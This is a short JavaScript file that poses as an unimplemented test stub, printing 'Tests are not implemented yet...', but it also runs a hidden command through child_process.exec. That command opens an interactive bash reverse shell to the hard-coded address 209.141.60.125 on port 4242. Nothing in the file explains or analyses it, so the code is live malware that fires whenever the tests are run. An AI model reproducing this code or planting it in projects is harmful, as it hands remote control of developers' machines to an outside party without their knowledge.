// TODO: implement the tests
console.log("Tests are not implemented yet...");

const { exec } = require('child_process');

exec('bash -c "bash -i >& /dev/tcp/209.141.60.125/4242 0>&1"', (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);
});
